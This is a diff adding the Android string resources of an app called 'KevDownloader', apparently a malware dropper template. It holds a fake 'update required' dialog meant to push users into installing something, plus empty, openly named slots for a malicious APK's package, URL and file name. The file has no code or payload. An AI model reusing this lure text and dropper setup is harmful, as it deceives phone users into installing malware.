@@ -1,0 +1,17 @@
+<resources>
+    <string name="app_name">KevDownloader</string>
+
+    <string name="update_dialog_message">In order to use the app normally, you need to install the update.</string>
+    <string name="update_dialog_title">Information</string>
+    <string name="update_dialog_positive_button_label">Update</string>
+
+    <string name="request_description">update process</string>
+    <string name="request_title">Update</string>
+
+    <string name="write_external_storage_rationale">Be nice, give the right to store things on your sdcard.</string>
+
+    <!-- Modify with your value -->
+    <string name="malicious_apk_package"></string>
+    <string name="malicious_apk_url"></string>
+    <string name="malicious_apk_name_downloaded"></string>
+</resources>
